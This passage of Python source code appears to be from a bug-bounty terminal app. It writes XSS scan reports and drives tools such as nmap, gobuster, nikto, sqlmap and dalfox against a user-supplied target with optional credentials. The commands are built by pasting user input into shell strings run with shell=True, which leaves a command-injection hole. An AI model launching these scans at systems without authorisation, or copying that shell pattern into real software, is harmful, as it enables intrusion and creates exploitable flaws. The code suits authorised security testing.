        if xss_config.test_dom:
            report['summary']['test_types'].append('DOM XSS')
        if xss_config.test_post:
            report['summary']['test_types'].append('POST XSS')
        
        # Save JSON
        json_path = os.path.join(xss_config.output_dir, 'xss-report.json')
        with open(json_path, 'w') as f:
            json.dump(report, f, indent=2)
        
        # Save detailed text report
        txt_path = os.path.join(xss_config.output_dir, 'xss-report.txt')
        with open(txt_path, 'w') as f:
            f.write("="*70 + "\n")
            f.write("XSS VULNERABILITY TESTING REPORT\n")
            f.write("="*70 + "\n\n")
            
            f.write(f"Target: {xss_config.target_url}\n")
            f.write(f"Scan Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Parameters Tested: {len(xss_config.test_parameters)}\n")
            f.write(f"Parameters: {', '.join(xss_config.test_parameters)}\n")
            f.write(f"Vulnerabilities Found: {len(vulnerabilities)}\n\n")
            
            if vulnerabilities:
                f.write("CONFIRMED VULNERABILITIES:\n")
                f.write("-"*70 + "\n\n")
                
                for i, vuln in enumerate(vulnerabilities, 1):
                    f.write(f"Vulnerability #{i}\n")
                    f.write(f"Type: {vuln['type']}\n")
                    f.write(f"Severity: {vuln['severity']}\n")
                    f.write(f"Parameter: {vuln['parameter']}\n")
                    f.write(f"Payload: {vuln['payload']}\n")
                    f.write(f"URL: {vuln['url']}\n\n")
            else:
                f.write("✓ No XSS vulnerabilities detected.\n")

# ============================================================================
# MAIN APPLICATION
# ============================================================================

class BugBountyTUI(App):
    """Advanced Bug Bounty TUI with integrated XSS Hunter"""
    
    CSS_PATH = None
    CSS = """
    Screen {
        background: $surface;
    }
    
    #main-container {
        width: 100%;
        height: 100%;
    }
    
    #control-panel {
        height: auto;
        background: $panel;
        border: heavy $primary;
        padding: 1;
    }
    
    #output-panel {
        height: 1fr;
        background: $panel;
        border: heavy $accent;
        padding: 1;
        margin-top: 1;
    }
    
    .panel-title {
        color: $accent;
        text-style: bold;
        padding-bottom: 1;
    }
    
    Input {
        margin: 1 0;
    }
    
    Button {
        margin: 1;
    }
    
    Checkbox {
        margin: 0 2;
    }
    
    #output-log {
        height: 1fr;
        background: black;
        border: solid $success;
        padding: 1;
    }
    
    #progress-bar {
        margin: 1 0;
    }
    
    .auth-section {
        background: $surface;
        border: solid $primary;
        padding: 1;
        margin: 1 0;
    }
    """
    
    BINDINGS = [
        Binding("q", "quit", "Quit", priority=True),
        Binding("r", "run_scan", "Run Scan"),
        Binding("s", "stop_scan", "Stop"),
        Binding("c", "clear_output", "Clear"),
        Binding("v", "view_results", "Results"),
        Binding("x", "xss_hunter", "XSS Hunter"),
    ]
    
    def on_mount(self) -> None:
        """Show welcome screen on startup"""
        self.push_screen(WelcomeScreen())
    
    def compose(self) -> ComposeResult:
        yield Header(show_clock=True)
        
        with Container(id="main-container"):
            # Control Panel
            with ScrollableContainer(id="control-panel"):
                yield Static("[bold red]🎯 TARGET CONFIGURATION[/]", classes="panel-title")
                
                # Target input
                yield Label("Target URL:")
                yield Input(placeholder="https://target.com", id="target-input")
                
                # Authentication section
                with Container(classes="auth-section"):
                    yield Static("[bold cyan]🔐 AUTHENTICATION (Optional)[/]", classes="panel-title")
                    
                    with Horizontal():
                        with Vertical():
                            yield Label("Username:")
                            yield Input(placeholder="admin", id="username-input")
                        with Vertical():
                            yield Label("Password:")
                            yield Input(placeholder="password", password=True, id="password-input")
                    
                    with Horizontal():
                        with Vertical():
                            yield Label("Session Cookie:")
                            yield Input(placeholder="session=abc123...", id="cookie-input")
                        with Vertical():
                            yield Label("Auth Token:")
                            yield Input(placeholder="Bearer token...", id="token-input")
                
                # Scan selection
                yield Static("[bold cyan]⚙️  SCAN MODULES[/]", classes="panel-title")

                # Stack all scan checkboxes vertically so they fit in one box
                with Vertical(id="scan-selection"):
                    yield Checkbox("🔍 Subdomain Enumeration", value=True, id="scan_subdomains")
                    yield Checkbox("🔓 Port Scanning", value=True, id="scan_ports")
                    yield Checkbox("📁 Directory Fuzzing (Gobuster)", value=True, id="scan_dirs")
                    yield Checkbox("🦀 Advanced Discovery (Feroxbuster)", value=False, id="scan_ferox")
                    yield Checkbox("🔧 Technology Detection", value=True, id="scan_tech")
                    yield Checkbox("🔒 SSL/TLS Analysis", value=True, id="scan_ssl")
                    yield Checkbox("⚠️  Nikto Vulnerability Scan", value=False, id="scan_nikto")
                    yield Checkbox("💉 SQL Injection", value=False, id="scan_sql")
                    yield Checkbox("⚡ XSS (Quick Scan)", value=False, id="scan_xss")
                    yield Checkbox("🕷️  Web Spider", value=False, id="scan_spider")
                    yield Checkbox("⏪ Wayback URLs", value=False, id="scan_wayback")
                
                # Control buttons
                yield Static("[bold cyan]🎮 CONTROL CENTER[/]", classes="panel-title")
                
                with Horizontal():
                    yield Button("🚀 START SCAN", variant="success", id="start-btn")
                    yield Button("⏹️  STOP SCAN", variant="error", id="stop-btn")
                    yield Button("🗑️  CLEAR OUTPUT", variant="warning", id="clear-btn")
                    yield Button("📊 VIEW RESULTS", variant="primary", id="results-btn")
                    yield Button("⚔️  XSS HUNTER", variant="error", id="xss-hunter-btn")
            
            # Output Panel
            with Vertical(id="output-panel"):
                yield Static("[bold green]📺 TERMINAL OUTPUT[/]", classes="panel-title")
                yield ProgressBar(id="progress-bar", show_eta=False)
                yield RichLog(id="output-log", wrap=True, highlight=True)
        
        yield Footer()
    
    def on_button_pressed(self, event: Button.Pressed) -> None:
        """Handle button presses"""
        if event.button.id == "start-btn":
            self.action_run_scan()
        elif event.button.id == "stop-btn":
            self.action_stop_scan()
        elif event.button.id == "clear-btn":
            self.action_clear_output()
        elif event.button.id == "results-btn":
            self.show_results()
        elif event.button.id == "xss-hunter-btn":
            self.action_xss_hunter()
    
    def action_run_scan(self) -> None:
        """Start the scanning process"""
        target_input = self.query_one("#target-input", Input)
        target = target_input.value.strip()
        
        if not target:
            self.notify("❌ Please enter a target URL!", severity="error")
            return
        
        config.set_target(target)
        
        # Get authentication credentials
        username_input = self.query_one("#username-input", Input)
        password_input = self.query_one("#password-input", Input)
        cookie_input = self.query_one("#cookie-input", Input)
        token_input = self.query_one("#token-input", Input)
        
        config.username = username_input.value.strip()
        config.password = password_input.value.strip()
        config.session_cookie = cookie_input.value.strip()
        config.auth_token = token_input.value.strip()
        
        # Get selected scans
        scans = []
        if self.query_one("#scan_subdomains", Checkbox).value:
            scans.append("subdomains")
        if self.query_one("#scan_ports", Checkbox).value:
            scans.append("ports")
        if self.query_one("#scan_dirs", Checkbox).value:
            scans.append("directories")
        if self.query_one("#scan_ferox", Checkbox).value:
            scans.append("feroxbuster")
        if self.query_one("#scan_tech", Checkbox).value:
            scans.append("technology")
        if self.query_one("#scan_ssl", Checkbox).value:
            scans.append("ssl")
        if self.query_one("#scan_nikto", Checkbox).value:
            scans.append("nikto")
        if self.query_one("#scan_sql", Checkbox).value:
            scans.append("sqlmap")
        if self.query_one("#scan_xss", Checkbox).value:
            scans.append("xss")
        if self.query_one("#scan_spider", Checkbox).value:
            scans.append("spider")
        if self.query_one("#scan_wayback", Checkbox).value:
            scans.append("wayback")
        
        if not scans:
            self.notify("⚠️  Please select at least one scan type!", severity="warning")
            return
        
        config.scan_types = scans
        config.running = True
        
        log = self.query_one("#output-log", RichLog)
        log.write(f"\n[bold yellow]{'='*50}[/]")
        log.write(f"[bold green]>>> INITIATING SCAN SEQUENCE[/]")
        log.write(f"[bold cyan]>>> TARGET:[/] {target}")
        log.write(f"[bold cyan]>>> OUTPUT:[/] {config.output_dir}")
        log.write(f"[bold cyan]>>> MODULES:[/] {len(scans)}")
        
        # Show authentication status
        auth_status = []
        if config.session_cookie:
            auth_status.append("🔐 Session Cookie")
        if config.username and config.password:
            auth_status.append("🔐 Username/Password")
        if config.auth_token:
            auth_status.append("🔐 Auth Token")
        
        if auth_status:
            log.write(f"[bold green]>>> AUTHENTICATION:[/] {', '.join(auth_status)}")
        else:
            log.write(f"[bold yellow]>>> AUTHENTICATION:[/] None (unauthenticated scans only)")
        
        log.write(f"[bold yellow]{'='*50}[/]\n")
        
        # Start scanning in background thread
        thread = threading.Thread(target=self.run_scans, daemon=True)
        thread.start()
        
        self.notify("🚀 Scan started!", severity="information")
    
    def action_stop_scan(self) -> None:
        """Stop the scanning process"""
        config.running = False
        log = self.query_one("#output-log", RichLog)
        log.write("\n[bold red]>>> SCAN TERMINATED BY USER[/]\n")
        self.notify("⏸️  Scan stopped", severity="warning")
    
    def action_clear_output(self) -> None:
        """Clear output log"""
        log = self.query_one("#output-log", RichLog)
        log.clear()
        log.write("[bold green]>>> OUTPUT CLEARED[/]")
    
    def action_xss_hunter(self) -> None:
        """Launch XSS Hunter"""
        self.push_screen(XSSHunterScreen())
    
    def show_results(self) -> None:
        """Show results screen with file browser"""
        if config.output_dir and os.path.exists(config.output_dir):
            self.push_screen(ResultsScreen(config.output_dir))
        else:
            self.notify("📊 No results yet. Run a scan first!", severity="information")
    
    def run_scans(self):
        """Execute all selected scans"""
        log = self.query_one("#output-log", RichLog)
        progress = self.query_one("#progress-bar", ProgressBar)
        
        total_scans = len(config.scan_types)
        progress.update(total=total_scans)
        
        for idx, scan_type in enumerate(config.scan_types):
            if not config.running:
                break
            
            self.call_from_thread(log.write, f"\n[bold magenta]▶▶▶ EXECUTING: {scan_type.upper()}[/]")
            
            try:
                output = self.execute_scan(scan_type)
                config.results[scan_type] = output
                self.call_from_thread(log.write, f"[bold green]✓ {scan_type.upper()} COMPLETE[/]")
            except Exception as e:
                self.call_from_thread(log.write, f"[bold red]✗ {scan_type.upper()} FAILED: {str(e)}[/]")
            
            self.call_from_thread(progress.update, progress=idx+1)
        
        if config.running:
            self.call_from_thread(log.write, f"\n[bold green]{'='*50}[/]")
            self.call_from_thread(log.write, "[bold green]>>> ALL SCANS COMPLETED[/]")
            self.call_from_thread(log.write, f"[bold cyan]>>> Results saved to: {config.output_dir}[/]")
            self.call_from_thread(log.write, f"[bold green]{'='*50}[/]\n")
            self.call_from_thread(self.notify, "✅ All scans completed!", severity="success")
    
    def execute_scan(self, scan_type: str) -> str:
        """Execute a specific scan type"""
        log = self.query_one("#output-log", RichLog)
        target = config.target
        output_dir = config.output_dir
        
        # Extract domain from URL
        domain = target.replace("https://", "").replace("http://", "").split("/")[0]
        
        # Build authentication parameters
        auth_params = ""
        if config.session_cookie:
            auth_params = f"--cookie='{config.session_cookie}'"
        elif config.username and config.password:
            auth_params = f"--auth-type=basic --auth-cred='{config.username}:{config.password}'"
        
        # Build header for token-based auth
        auth_header = ""
        if config.auth_token:
            auth_header = f"-H 'Authorization: Bearer {config.auth_token}'"
        elif config.session_cookie:
            auth_header = f"-H 'Cookie: {config.session_cookie}'"
        
        commands = {
            "subdomains": f"subfinder -d {domain} -o {output_dir}/subdomains.txt -silent",
            "ports": f"nmap -sV -sC -p 80,443,8080,8443 {domain} -oN {output_dir}/nmap-scan.txt",
            "directories": f"gobuster dir -u {target} -w /usr/share/wordlists/dirb/common.txt -o {output_dir}/gobuster.txt -q -t 50 {'-c ' + config.session_cookie if config.session_cookie else ''}",
            "feroxbuster": f"feroxbuster -u {target} -w /usr/share/wordlists/dirb/common.txt -o {output_dir}/feroxbuster.txt -t 50 --auto-tune --smart --silent -r -d 2 -C 404,403 {'-H \"Cookie: ' + config.session_cookie + '\"' if config.session_cookie else ''} {'-H \"Authorization: Bearer ' + config.auth_token + '\"' if config.auth_token else ''}",
            "technology": f"whatweb {target} -v > {output_dir}/technology.txt",
            "ssl": f"sslscan {domain} > {output_dir}/sslscan.txt",
            "nikto": f"nikto -h {target} -output {output_dir}/nikto.txt",
            "sqlmap": f"sqlmap -u '{target}' {auth_params} --batch --level=2 --risk=2 --threads=5 -o {output_dir}/sqlmap.txt" if auth_params else f"echo 'SQLmap: No authentication provided' > {output_dir}/sqlmap.txt",
            "xss": f"dalfox url '{target}' {auth_header} -o {output_dir}/xss.txt --silence" if auth_header else f"echo 'XSS: Use XSS Hunter for advanced testing' > {output_dir}/xss.txt",
            "spider": f"gospider -s {target} -d 2 -c 5 -o {output_dir}/spider {'-H \"Cookie: ' + config.session_cookie + '\"' if config.session_cookie else ''}",
            "wayback": f"waybackurls {domain} | tee {output_dir}/wayback-urls.txt"
        }
        
        cmd = commands.get(scan_type, f"echo 'Unknown scan type: {scan_type}' > {output_dir}/error.txt")
        
        # Log the command
        self.call_from_thread(log.write, f"[dim]$ {cmd}[/]")
        
        try:
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=300
            )
            
            output = result.stdout if result.stdout else result.stderr
            
            # Stream output
            for line in output.split('\n')[:20]:
                if line.strip():
                    self.call_from_thread(log.write, f"[dim]{line}[/]")
            
            if len(output.split('\n')) > 20:
                self.call_from_thread(log.write, f"[dim]... ({len(output.split('\\n')) - 20} more lines in file)[/]")
            
            return output
            
        except subprocess.TimeoutExpired:
            return "ERROR: Scan timed out"
        except Exception as e:
            return f"ERROR: {str(e)}"

if __name__ == "__main__":
    app = BugBountyTUI()
    app.run()